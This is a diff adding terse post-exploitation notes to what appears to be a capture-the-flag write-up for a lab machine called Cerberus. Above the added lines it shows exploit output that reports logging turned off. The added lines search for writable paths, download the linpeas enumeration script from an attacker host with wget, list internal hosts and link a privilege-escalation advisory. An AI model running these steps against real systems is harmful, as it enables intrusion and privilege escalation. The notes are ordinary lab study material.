@@ -96,3 +96,17 @@ the exploit was successfull
 [SUCCESS] Cleanup successful! Shutting down...
 [ALERT] In the process of exploitation, the application logging has been turned off. Log in manually to reset these settings!
 ```
+to see where we can write on the disk 
+
+`find / -writable 2>/dev/null`
+
+wget http://10.10.16.24:8000/linpeas.sh 
+
+icinga                                                                                                             
+127.0.0.1 iceinga.cerberus.local iceinga
+127.0.1.1 localhost
+172.16.22.1 DC.cerberus.local DC cerberus.local
+
+for privilege escalation
+https://seclists.org/oss-sec/2022/q2/188
+
